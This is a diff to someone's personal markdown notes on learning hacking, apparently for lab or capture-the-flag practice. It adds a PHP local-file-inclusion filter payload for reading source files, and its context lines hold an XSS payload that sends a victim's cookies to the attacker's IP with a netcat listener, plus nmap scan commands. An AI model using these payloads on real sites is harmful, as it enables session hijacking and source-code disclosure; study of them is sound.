@@ -10,6 +10,10 @@ Random notes I've made while learning about hacking that might prove useful in t
 - op eigen systeem: `nc -lvnp 80`
 - op target webpage: `<script>document.write('<img src="http://<your ip>/?cookies=' + document.cookie + '" />')</script>`
 
+## Local File Inclusion (LFI)
+- in url parameter: `php://filter/convert.base64-encode/resource=<file>`
+- for example the index.php, which can then be analyzed to find vulns
+
 ## Nmap
 - `nmap -sC -sV nmap 10.10.10.14 > nmap_scan`
 - vulnerability scan: `nmap -sV -sC --script vuln 10.10.4.35`
